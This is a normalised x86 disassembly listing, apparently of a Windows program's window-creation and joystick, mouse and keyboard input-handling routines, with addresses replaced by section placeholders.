mov [ esp + 0x18 ] 0x3
mov [ esp + 0x14 ] 0x30
mov [ esp + 0x2c ] edi
mov [ esp + 0x40 ] edi
call [ LoadCursorA@IAT ]
push 0xf
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
call [ GetSysColorBrush@IAT ]
mov [ esp + 0x2c ] eax
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x18 ] sub_494d20
call [ RegisterClassExA@IAT ]
test ax ax
jne r-xdata
mov edx [ rw-data ]
push ebx
xor ebx ebx
cmp esi edx
setne bl
push edi
push 0xfffffffa
push esi
dec ebx
and ebx 0xc0000000
add ebx 0x90000000
call ebp
push eax
push edi
push esi
push edi
push edi
push edi
push edi
push ebx
push edi
push r--data
push edi
call [ CreateWindowExA@IAT ]
pop ebx
pop edi
pop esi
pop ebp
add esp 0x30
retn
call [ GetLastError@IAT ]
cmp eax 0x582
je r-xdata
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x30
retn
sub_495d00
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x110
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
mov edi [ rw-data ]
xor ebx ebx
lea ebp [ esi + 0x4 ]
mov ecx edi
sub ecx esi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp ] 0x0
je r-xdata
cmp ebx edx
jge r-xdata
push 0x0
call sub_46e730
add esp 0x4
call [ timeGetTime@IAT ]
mov esi [ rw-data ]
mov [ esp + 0xa4 ] eax
mov [ esp + 0x3c ] 0x0
inc ebx
add ebp 0xdc
jmp r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
test esi esi
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax [ rw-data ]
imul ebx ebx 0x1a0
add ebx eax
mov [ esp + 0x38 ] ebx
xor edi edi
mov ebp esi
lea esp [ esp ]
mov eax [ esp + 0x3c ]
cmp eax edx
jge r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test esi esi
jne r-xdata
movzx ecx [ ebx ]
movzx edx [ ebx + 0x2 ]
mov eax [ ebp ]
shl ecx 0x10
or ecx edx
cmp eax ecx
je r-xdata
cmp edi edx
jge r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
inc edi
add ebp 0xdc
jmp r-xdata
imul edi edi 0xdc
mov eax [ edi + esi + 0x4 ]
add edi esi
test eax eax
mov [ esp + 0x28 ] edi
jne r-xdata
test esi esi
mov edi [ esp + 0x3c ]
jne r-xdata
cmp edi edx
jne r-xdata
test esi esi
jne r-xdata
inc [ esp + 0x3c ]
jmp r-xdata
mov [ esp + 0x2f ] 0x0
call [ GetFocus@IAT ]
mov edi [ GetParent@IAT ]
mov esi eax
push eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x34 ] esi
call edi
test eax eax
je r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edi [ esp + 0x28 ]
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
lea ecx [ ecx ]
xor edi edi
cmp [ esp + 0x3c ] edx
jl r-xdata
mov eax [ esp + 0x3c ]
lea edx [ esp + 0xec ]
push edx
push eax
mov [ esp + 0xf4 ] 0x34
mov [ esp + 0xf8 ] 0xff
call [ joyGetPosEx@IAT ]
test eax eax
jne r-xdata
cmp esi [ rw-data ]
je r-xdata
mov esi eax
push eax
mov [ esp + 0x34 ] esi
call edi
test eax eax
jne r-xdata
mov edx [ esp + 0x38 ]
mov ecx [ esp + 0xa4 ]
mov esi [ edx + 0x198 ]
mov eax ecx
sub eax esi
mov [ esp + 0x50 ] eax
mov eax [ edx + 0x19c ]
cmp eax 0xffffffff
mov [ edx + 0x198 ] ecx
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov [ esp + 0x4c ] eax
mov ecx [ edi + 0x14 ]
mov [ esp + 0x4c ] ecx
jmp r-xdata
mov esi [ rw-data ]
mov [ esp + 0x2f ] 0x1
mov eax [ esp + 0xf4 ]
sub eax ecx
cdq
xor eax edx
sub eax edx
xor edx edx
div esi
shr eax 0x1
test eax eax
mov [ esp + 0x40 ] eax
jg r-xdata
mov esi 0x1
mov esi [ edx + 0x24 ]
mov ecx [ edx + 0x28 ]
mov eax [ esp + 0x10c ]
mov ebp [ edi + 0x10 ]
add ecx esi
and eax 0xffff
shr ecx 0x1
mov [ esp + 0x1c ] eax
lea esi [ ebp + ebp + 0x1 ]
xor edx edx
lea eax [ ecx - 0x1 ]
div esi
mov esi eax
test esi esi
ja r-xdata
mov eax [ esp + 0x38 ]
mov edi [ eax + 0x30 ]
mov edx [ eax + 0x2c ]
mov ebx [ esp + 0xf8 ]
add edi edx
shr edi 0x1
mov eax ebx
sub eax edi
cdq
xor eax edx
sub eax edx
xor edx edx
div esi
shr eax 0x1
mov [ esp + 0x44 ] eax
test eax eax
mov eax 0x1
jg r-xdata
mov [ esp + 0x40 ] 0x1
test ebp ebp
jne r-xdata
mov [ esp + 0x44 ] eax
mov eax [ esp + 0xf4 ]
mov edx ecx
sub edx esi
cmp eax edx
jae r-xdata
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
add ecx esi
cmp eax ecx
jbe r-xdata
mov eax [ esp + 0x1c ]
or eax 0x10000
jmp r-xdata
mov eax edi
sub eax esi
cmp ebx eax
jae r-xdata
mov eax [ esp + 0x1c ]
or eax 0x20000
mov [ esp + 0x1c ] eax
add edi esi
cmp ebx edi
jbe r-xdata
mov eax [ esp + 0x1c ]
or eax 0x40000
jmp r-xdata
mov ecx [ esp + 0x38 ]
test [ ecx + 0x60 ] 0x10
je r-xdata
mov eax [ esp + 0x1c ]
or eax 0x80000
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x38 ]
mov ecx [ edx + 0x194 ]
mov ebx [ esp + 0x1c ]
mov eax ecx
xor eax ebx
mov edx eax
and edx ebx
and eax ecx
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x28 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x16 ] 0x0
mov [ esp + 0x17 ] 0x0
mov eax 0x2
add edx 0x20
mov eax [ esp + 0x114 ]
cmp ax 0xffff
je r-xdata
cmp [ edx ] 0x27
jne r-xdata
lea ecx [ eax - 0x2 ]
mov esi 0x1
shl esi cl
test ebx esi
je r-xdata
lea ecx [ eax + 0x1194 ]
cmp ecx 0x8ca0
jb r-xdata
cmp [ edx + 0x4 ] 0x27
jne r-xdata
lea ecx [ eax - 0x1 ]
mov esi 0x1
shl esi cl
test ebx esi
je r-xdata
mov [ esp + 0x16 ] 0x1
mov eax 0xe90452d5
mul ecx
shr edx 0xd
cmp edx 0x3
jne r-xdata
sub ecx 0x8ca0
cmp [ edx + 0x8 ] 0x27
jne r-xdata
mov esi 0x1
mov ecx eax
shl esi cl
test ebx esi
je r-xdata
mov [ esp + 0x16 ] 0x1
cmp edx 0x1
jne r-xdata
mov eax [ esp + 0x1c ]
or eax 0x100000
jmp r-xdata
cmp [ edx + 0xc ] 0x27
jne r-xdata
lea ecx [ eax + 0x1 ]
mov esi 0x1
shl esi cl
test ebx esi
je r-xdata
mov [ esp + 0x16 ] 0x1
test edx edx
jne r-xdata
mov eax [ esp + 0x1c ]
or eax 0x200000
jmp r-xdata
mov [ esp + 0x1c ] eax
cmp [ edx + 0x10 ] 0x27
jne r-xdata
lea ecx [ eax + 0x2 ]
mov esi 0x1
shl esi cl
test ebx esi
je r-xdata
mov [ esp + 0x16 ] 0x1
cmp edx 0x2
jne r-xdata
mov eax [ esp + 0x1c ]
or eax __dos_header
jmp r-xdata
cmp [ edx + 0x14 ] 0x27
jne r-xdata
lea ecx [ eax + 0x3 ]
mov esi 0x1
shl esi cl
test ebx esi
je r-xdata
mov [ esp + 0x16 ] 0x1
mov eax [ esp + 0x1c ]
or eax 0x800000
cmp [ edx + 0x18 ] 0x27
jne r-xdata
lea ecx [ eax + 0x4 ]
mov esi 0x1
shl esi cl
test ebx esi
je r-xdata
mov [ esp + 0x16 ] 0x1
add eax 0x8
lea ecx [ eax - 0x2 ]
add edx 0x20
cmp ecx 0x10
jl r-xdata
lea ecx [ eax + 0x5 ]
mov esi 0x1
shl esi cl
test ebx esi
je r-xdata
mov [ esp + 0x16 ] 0x1
cmp [ edx - 0x4 ] 0x27
jne r-xdata
mov edx [ esp + 0x28 ]
mov eax 0x2
add edx 0x7c
mov [ esp + 0x16 ] 0x1
cmp cl 0x1
jne r-xdata
cmp [ edx - 0x60 ] 0x49
je r-xdata
mov cl [ esp + 0x16 ]
test cl cl
jne r-xdata
cmp [ edx ] 0x49
jne r-xdata
mov edi [ esp + 0x18 ]
lea ecx [ eax - 0x2 ]
mov esi 0x1
shl esi cl
mov ecx [ esp + 0x24 ]
or ecx edi
or ecx ebx
test ecx esi
je r-xdata
jmp r-xdata
cmp cl 0x1
jne r-xdata
cmp [ edx - 0x5c ] 0x49
je r-xdata
cmp [ edx + 0x4 ] 0x49
jne r-xdata
mov [ esp + 0x17 ] 0x1
mov cl [ esp + 0x16 ]
test cl cl
jne r-xdata
mov edi [ esp + 0x18 ]
lea ecx [ eax - 0x1 ]
mov esi 0x1
shl esi cl
mov ecx [ esp + 0x24 ]
or ecx edi
or ecx ebx
test ecx esi
je r-xdata
jmp r-xdata
cmp [ edx + 0x8 ] 0x49
jne r-xdata
cmp cl 0x1
jne r-xdata
cmp [ edx - 0x58 ] 0x49
je r-xdata
mov [ esp + 0x17 ] 0x1
cmp [ edx + 0xc ] 0x49
jne r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x24 ]
or esi edi
mov edi 0x1
mov ecx eax
shl edi cl
or esi ebx
test edi esi
je r-xdata
mov cl [ esp + 0x16 ]
test cl cl
jne r-xdata
jmp r-xdata
cmp [ edx + 0x10 ] 0x49
jne r-xdata
mov edi [ esp + 0x18 ]
lea ecx [ eax + 0x1 ]
mov esi 0x1
shl esi cl
mov ecx [ esp + 0x24 ]
or ecx edi
or ecx ebx
test ecx esi
je r-xdata
mov [ esp + 0x17 ] 0x1
cmp cl 0x1
jne r-xdata
cmp [ edx - 0x54 ] 0x49
je r-xdata
cmp [ edx + 0x14 ] 0x49
jne r-xdata
mov edi [ esp + 0x18 ]
lea ecx [ eax + 0x2 ]
mov esi 0x1
shl esi cl
mov ecx [ esp + 0x24 ]
or ecx edi
or ecx ebx
test ecx esi
je r-xdata
mov cl [ esp + 0x16 ]
test cl cl
jne r-xdata
mov [ esp + 0x17 ] 0x1
jmp r-xdata
cmp [ edx + 0x18 ] 0x49
jne r-xdata
mov edi [ esp + 0x18 ]
lea ecx [ eax + 0x3 ]
mov esi 0x1
shl esi cl
mov ecx [ esp + 0x24 ]
or ecx edi
or ecx ebx
test ecx esi
je r-xdata
mov cl [ esp + 0x16 ]
test cl cl
jne r-xdata
mov [ esp + 0x17 ] 0x1
cmp cl 0x1
jne r-xdata
cmp [ edx - 0x50 ] 0x49
je r-xdata
cmp [ edx + 0x1c ] 0x49
jne r-xdata
mov edi [ esp + 0x18 ]
lea ecx [ eax + 0x4 ]
mov esi 0x1
shl esi cl
mov ecx [ esp + 0x24 ]
or ecx edi
or ecx ebx
test ecx esi
je r-xdata
mov cl [ esp + 0x16 ]
test cl cl
jne r-xdata
mov [ esp + 0x17 ] 0x1
cmp cl 0x1
jne r-xdata
cmp [ edx - 0x4c ] 0x49
je r-xdata
jmp r-xdata
mov ebp [ esp + 0x18 ]
mov ebp [ esp + 0x18 ]
lea ecx [ eax + 0x5 ]
mov esi 0x1
shl esi cl
mov ecx [ esp + 0x24 ]
or ecx ebp
or ecx ebx
test ecx esi
je r-xdata
mov cl [ esp + 0x16 ]
test cl cl
jne r-xdata
mov [ esp + 0x17 ] 0x1
cmp cl 0x1
jne r-xdata
cmp [ edx - 0x48 ] 0x49
je r-xdata
jmp r-xdata
mov cl [ esp + 0x16 ]
test cl cl
jne r-xdata
mov al [ esp + 0x16 ]
test al al
jne r-xdata
add eax 0x8
lea ecx [ eax - 0x2 ]
add edx 0x20
cmp ecx 0x10
jl r-xdata
mov [ esp + 0x17 ] 0x1
cmp cl 0x1
jne r-xdata
cmp [ edx - 0x44 ] 0x49
je r-xdata
jmp r-xdata
test ebp 0x30000
je r-xdata
mov al [ esp + 0x17 ]
test al al
jne r-xdata
jmp r-xdata
test ebp 0xc0000
je r-xdata
test ebx 0xc0000
je r-xdata
cmp [ esp + 0x4c ] 0x2
jne r-xdata
mov edx [ esp + 0x38 ]
xor eax eax
test ebp ebp
mov [ edx + 0x194 ] ebx
mov ecx 0xe
lea edi [ esp + 0x5c ]
[ edi ]
mov [ esp + 0x5c ] eax
mov [ esp + 0x78 ] 0x1
je r-xdata
test ebx 0x30000
je r-xdata
and ebp 0xfffcffff
and ebx 0xfffcffff
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ebx
mov edi [ esp + 0x28 ]
mov eax [ edi + 0xc ]
fld [ eax * 4 + rw-data ]
mov al [ esp + 0x2f ]
test al al
fstp [ esp + 0x48 ]
je r-xdata
call [ timeGetTime@IAT ]
mov [ rw-data ] eax
and ebp 0xfff3ffff
and ebx 0xfff3ffff
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ebx
mov ecx [ rw-data ]
cmp [ esp + 0x30 ] ecx
jne r-xdata
mov ebx [ esp + 0x18 ]
xor esi esi
add edi 0x1c
mov ebp 0x91
mov edx 0x2
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ esp + 0x16 ]
test al al
jne r-xdata
mov al [ esp + 0x17 ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
mov esi [ SystemParametersInfoA@IAT ]
push 0x0
lea edx [ esp + 0x98 ]
push edx
push 0x0
push 0x16
call esi
test eax eax
mov eax 0x2
je r-xdata
mov eax [ esp + 0x20 ]
cmp [ rw-data ] eax
je r-xdata
cmp esi 0x18
jl r-xdata
cmp esi 0x18
jge r-xdata
mov edx [ esp + 0x28 ]
mov esi [ esp + 0x38 ]
xor ebp ebp
add edx 0x1c
mov [ esp + 0x30 ] edx
mov edx [ esp + 0x18 ]
xor esi esi
test ebp 0x110000
je r-xdata
inc eax
imul eax eax 0xfa
push 0x0
mov [ esp + 0x98 ] eax
lea eax [ esp + 0x9c ]
push eax
push 0x0
push 0xa
call esi
test eax eax
mov eax 0xa
je r-xdata
mov eax [ esp + 0x94 ]
cmp ecx eax
je r-xdata
inc esi
add edi 0x4
cmp esi 0x30
jl r-xdata
lea ecx [ esi - 0x18 ]
cmp esi 0x10
jl r-xdata
cmp ebp 0x18
jl r-xdata
cmp ebp 0x18
jge r-xdata
test ebp 0x220000
je r-xdata
push 0x2
call sub_46cfa0
add esp 0x4
mov esi eax
lea ecx [ eax + 0x2 ]
mov eax 0x3e8
cdq
idiv ecx
mov edx [ esp + 0x94 ]
mov ecx edx
sub ecx eax
mov [ esp + 0x98 ] ecx
jns r-xdata
mov eax [ esp + 0x98 ]
jmp r-xdata
mov eax [ edi ]
cmp [ eax * 4 + rw-data ] ebp
jne r-xdata
cmp esi 0x14
jl r-xdata
cmp esi 0x14
jge r-xdata
mov ecx [ esp + 0x30 ]
inc ebp
add ecx 0x4
cmp ebp 0x30
mov [ esp + 0x30 ] ecx
jl r-xdata
lea ecx [ ebp - 0x18 ]
cmp ebp 0x10
jl r-xdata
test ebp r-xdata
je r-xdata
push 0x0
call sub_46cfa0
add esp 0x4
or esi eax
xor eax eax
xor eax eax
xor ecx ecx
mov [ esp + 0x98 ] ecx
jmp r-xdata
mov eax [ esp + 0x6c ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push ebp
call sub_48a5f0
add esp 0xc
mov edx 0x2
mov ecx esi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0x18 ]
mov eax [ esp + 0x4c ]
jmp r-xdata
mov al [ esp + 0x16 ]
test al al
mov edi 0x2
jne r-xdata
mov al [ esp + 0x16 ]
test al al
jne r-xdata
cmp eax 0x18
jne r-xdata
test eax eax
jne r-xdata
cmp ebp 0x14
jl r-xdata
cmp ebp 0x14
jge r-xdata
test ebp 0x880000
je r-xdata
push 0x3
call sub_46cfa0
add esp 0x4
or esi eax
test ebp 0x20000
je r-xdata
or [ esp + 0x7c ] 0x25
mov [ rw-data ] eax
jmp r-xdata
test ebp 0x10000
je r-xdata
cmp [ esp + 0x7c ] 0x0
je r-xdata
xor ebp ebp
cmp [ esp + 0x7c ] bp
je r-xdata
mov eax 0x1
shl eax cl
test ebx eax
je r-xdata
cmp eax edx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0x19
jne r-xdata
test ebx edi
je r-xdata
cmp eax 0x1
jne r-xdata
test edx edi
je r-xdata
mov ecx ebp
jmp r-xdata
mov eax [ esp + 0x28 ]
cmp [ eax + 0x18 ] edi
cmp [ esp + 0x4c ] edi
jmp r-xdata
test esi esi
je r-xdata
push 0x1
call sub_46cfa0
add esp 0x4
or esi eax
test ebp 0x40000
je r-xdata
or [ esp + 0x7c ] 0x27
mov [ rw-data ] eax
jmp r-xdata
xor esi esi
mov edi edi
mov ebp 0x1
mov ebx 0x1
mov ebx 0x2
jmp r-xdata
mov eax [ esp + 0x4c ]
test eax eax
jne r-xdata
mov esi [ esp + 0x18 ]
test esi 0x10000
je r-xdata
cmp eax 0x1a
jne r-xdata
test edx edi
je r-xdata
fld [ esp + 0x48 ]
fadd st0
fstp [ esp + 0x48 ]
jmp r-xdata
test edx edi
je r-xdata
mov eax [ esp + 0x24 ]
test eax edi
je r-xdata
or [ esp + 0x6c ] 0x2
mov edi 0x1
shl edi cl
mov ecx [ esp + 0x30 ]
mov eax [ ecx ]
cmp eax 0x2
jge r-xdata
jne r-xdata
mov ebp [ esp + 0x28 ]
mov ebx [ ScreenToClient@IAT ]
mov edi [ GetCursorPos@IAT ]
xor esi esi
add ebp 0x1c
mov edx [ rw-data ]
push edx
call [ GetDC@IAT ]
mov esi eax
mov eax [ rw-data ]
test eax eax
je r-xdata
test ebp 0x80000
je r-xdata
or [ esp + 0x7c ] 0x26
mov [ rw-data ] eax
jmp r-xdata
inc esi
cmp esi 0x10
jl r-xdata
test edx edx
jne r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x30 ] esi
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x1c ]
test eax 0x10000
mov ebx [ esp + 0x50 ]
je r-xdata
test esi 0x20000
je r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x25
jmp r-xdata
cmp eax 0x57
jne r-xdata
test edx edi
je r-xdata
mov ecx [ esp + 0x4c ]
xor eax eax
test ecx ecx
sete al
mov [ esi + 0x19c ] eax
jmp r-xdata
mov ecx [ esp + 0x24 ]
test ecx edi
je r-xdata
or [ esp + 0x6c ] 0x8
or [ esp + 0x6c ] 0x4
jmp r-xdata
test ecx eax
je r-xdata
test ecx eax
je r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0xc0 ]
push edx
push esi
mov [ rw-data ] ecx
mov [ rw-data ] 0x64
call sub_473580
mov eax [ rw-data ]
add esp 0x8
push esi
push eax
call [ ReleaseDC@IAT ]
mov esi [ esp + 0xc0 ]
cmp [ rw-data ] esi
jle r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push eax
call sub_45ba40
mov eax [ rw-data ]
add eax [ esp + 0x50 ]
cmp eax edx
mov [ rw-data ] eax
jl r-xdata
mov [ rw-data ] eax
jmp r-xdata
mov eax [ edi + esi * 4 + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov ebx 0x1
mov ecx esi
shl ebx cl
test ebp ebx
je r-xdata
jmp r-xdata
cmp edx 0x1
je r-xdata
or [ esp + 0x7c ] 0xd
jmp r-xdata
push esi
call [ FreeLibrary@IAT ]
mov esi ebp
imul esi esi 0x1c
push 0x1c
lea ebp [ esp + esi + 0x60 ]
push ebp
push ebx
call edi
cmp [ esp + 0x7c ] 0x0
je r-xdata
mov ebx [ esp + 0x50 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0xe8 ] eax
xor ecx ecx
xor eax eax
test edx 0x10000
mov [ esp + 0xc8 ] 0x5
mov [ esp + 0xcc ] 0x6
mov [ esp + 0xd0 ] 0x7
mov [ esp + 0xd4 ] 0x4
mov [ esp + 0xd8 ] 0xffffffff
mov [ esp + 0xdc ] 0x0
mov [ esp + 0xe0 ] 0x3
mov [ esp + 0xe4 ] 0x2
je r-xdata
test eax 0x20000
je r-xdata
test ebx ebx
fild [ esp + 0x50 ]
jge r-xdata
test esi 0x40000
je r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x27
call sub_48a5f0
add esp 0xc
cmp eax 0x27
je r-xdata
test edx edi
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
or [ esp + 0x6c ] 0x10
jmp r-xdata
inc esi
add ebp 0x4
cmp esi 0x10
jl r-xdata
cmp [ rw-data ] 0x40000064
jne r-xdata
test [ esp + 0x24 ] eax
je r-xdata
lea edx [ esp + 0x9c ]
push edx
call edi
mov ecx [ rw-data ]
lea eax [ esp + 0x9c ]
push eax
push ecx
call ebx
mov edx [ esp + 0xa0 ]
mov eax [ esp + 0x9c ]
push edx
push eax
call sub_46cf30
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] esi
mov edx [ rw-data ]
lea ecx [ esp + 0xb0 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ esp + 0xbc ]
mov ebp [ esp + 0xc4 ]
mov ecx [ rw-data ]
sub eax ebp
push 0x0
lea edx [ esp + 0xb4 ]
mov [ esp + 0xb8 ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0xbc ] esi
mov [ esp + 0xc4 ] ecx
call [ InvalidateRect@IAT ]
test ebx 0x10000
je r-xdata
or [ esp + 0x7c ] 0x28
or [ esp + 0x7c ] 0x1b
cmp eax 0x55
je r-xdata
mov esi [ esp + 0x30 ]
push 0x1c
push ebp
push ebx
mov [ esp + esi + 0x70 ] 0x2
call edi
cmp eax 0x1
jne r-xdata
mov edx [ esp + 0x38 ]
test [ edx + 0x60 ] 0x10
je r-xdata
test edx 0x20000
je r-xdata
or ecx 0xffffffff
jmp r-xdata
mov eax [ esp + 0x1c ]
test eax 0x40000
je r-xdata
test ebx ebx
fild [ esp + 0x50 ]
jge r-xdata
fmul [ esp + 0x48 ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
imul eax [ esp + 0x44 ]
mov ecx [ esp + 0x64 ]
add esp 0x4
sub ecx eax
jmp r-xdata
fadd [ r--data ]
test esi 0x80000
je r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x26
call sub_48a5f0
jmp r-xdata
cmp eax 0x28
je r-xdata
mov eax [ esp + 0x4c ]
xor ecx ecx
cmp eax 0x2
sete cl
dec ecx
and ecx 0x2
mov [ esi + 0x19c ] ecx
jmp r-xdata
mov [ esi + 0x19c ] 0x0
mov ecx [ esp + 0x28 ]
mov edx [ ecx + 0x14 ]
mov [ esi + 0x19c ] edx
jmp r-xdata
mov ecx esi
mov eax 0x1
shl eax cl
cmp [ ebp ] 0x49
mov ecx [ esp + 0x18 ]
jne r-xdata
jmp r-xdata
lea eax [ esp + 0xa8 ]
push eax
call edi
mov edx [ rw-data ]
lea ecx [ esp + 0xa8 ]
push ecx
push edx
call ebx
mov eax [ esp + 0xac ]
mov ecx [ esp + 0xa8 ]
push eax
push ecx
call sub_46cf30
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push edx
call sub_45ba40
call sub_460b20
test eax eax
je r-xdata
add esp 0x8
test ebx 0x20000
je r-xdata
or [ esp + 0x7c ] 0x25
mov [ rw-data ] ecx
jmp r-xdata
cmp eax 0x56
je r-xdata
mov eax [ esp + 0x114 ]
cmp ax 0xffff
je r-xdata
mov eax [ esp + 0x114 ]
cmp ax 0xffff
je r-xdata
test edx 0x40000
je r-xdata
mov ecx 0x1
test eax 0x80000
je r-xdata
test ebx ebx
mov [ esp + 0x20 ] ebx
fild [ esp + 0x20 ]
jge r-xdata
fmul [ esp + 0x48 ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
imul eax [ esp + 0x44 ]
mov ecx [ esp + 0x64 ]
add esp 0x4
add ecx eax
fadd [ r--data ]
mov [ esp + 0x60 ] ecx
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x28
call sub_48a5f0
jmp r-xdata
add esp 0xc
cmp eax 0x49
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ rw-data ]
push eax
push 0x1
push 0x1c
call sub_48a5f0
add esp 0xc
jmp r-xdata
cmp [ rw-data ] 0x40000064
jne r-xdata
mov ecx [ rw-data ]
push ecx
dec eax
push 0x1
push eax
call sub_48a5f0
add esp 0xc
test ebx 0x40000
je r-xdata
or [ esp + 0x7c ] 0x27
mov [ rw-data ] ecx
jmp r-xdata
cmp esi 0x2
jne r-xdata
fld [ r--data ]
add eax 0xffffdcd8
test eax eax
fld1
fpatan
mov [ esp + 0x20 ] eax
fstp [ esp + 0x30 ]
fild [ esp + 0x20 ]
jge r-xdata
test ebx ebx
fld [ r--data ]
fld1
mov [ esp + 0x20 ] ebx
fpatan
fstp [ esp + 0x30 ]
fild [ esp + 0x20 ]
jge r-xdata
test edx 0x80000
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x60 ]
test eax eax
jne r-xdata
test ebx ebx
mov [ esp + 0x20 ] ebx
fild [ esp + 0x20 ]
jge r-xdata
fmul [ esp + 0x48 ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
imul eax [ esp + 0x48 ]
mov ecx [ esp + 0x68 ]
add esp 0x4
sub ecx eax
jmp r-xdata
fadd [ r--data ]
cmp eax 0x45
je r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push edx
call sub_45ba40
jmp r-xdata
test ebx 0x80000
je r-xdata
or [ esp + 0x7c ] 0x26
mov [ rw-data ] ecx
jmp r-xdata
cmp esi 0x3
jne r-xdata
or [ esp + 0x7c ] 0x9
jmp r-xdata
mov ecx [ rw-data ]
fmul [ esp + 0x30 ]
imul ecx ebx
fmul [ r--data ]
fcos
test ecx ecx
mov [ esp + 0x20 ] ecx
fild [ esp + 0x20 ]
jge r-xdata
fadd [ r--data ]
fmul [ esp + 0x48 ]
add eax 0xffffdcd8
test eax eax
mov [ esp + 0x20 ] eax
fmul [ r--data ]
fstp [ esp + 0x50 ]
fild [ esp + 0x20 ]
jge r-xdata
fadd [ r--data ]
lea edx [ ecx + eax * 2 ]
add eax edx
mov eax [ esp + eax * 4 + 0xd8 ]
test eax eax
mov [ esp + 0x20 ] eax
jl r-xdata
mov eax 0x1
or [ esp + 0x6c ] 0x1
jmp r-xdata
mov eax [ esp + 0x64 ]
test eax eax
je r-xdata
fmul [ esp + 0x48 ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
imul eax [ esp + 0x48 ]
mov ecx [ esp + 0x68 ]
add esp 0x4
add ecx eax
fadd [ r--data ]
mov [ esp + 0x64 ] ecx
test edx edi
je r-xdata
cmp eax 0x46
je r-xdata
mov [ rw-data ] ecx
mov al [ esp + 0x16 ]
test al al
je r-xdata
or [ esp + 0x7c ] 0x20
jmp r-xdata
fmulp st1
sub esp 0x8
fstp [ esp ]
call sub_452510
mov edx [ esp + 0x11c ]
add edx 0xffffdcd8
mov esi eax
imul esi [ esp + 0x48 ]
test edx edx
mov [ esp + 0x28 ] edx
fild [ esp + 0x28 ]
jge r-xdata
fadd [ r--data ]
fmul [ esp + 0x30 ]
sub esp 0x8
fmul [ r--data ]
fcos
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452510
imul eax [ esp + 0x48 ]
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x11c ]
add eax 0xffffdcd8
test eax eax
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
jge r-xdata
fadd [ r--data ]
fld [ r--data ]
mov eax [ rw-data ]
fld1
mov ebx [ esp + 0x50 ]
fpatan
imul eax ebx
test eax eax
fimul [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
fst [ esp + 0x30 ]
fcos
fild [ esp + 0x20 ]
jge r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0x18 ]
test eax eax
jne r-xdata
test ebx edi
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp eax 0x55
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push edx
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edi + esi * 4 + 0x7c ]
mov ecx [ eax * 4 + rw-data ]
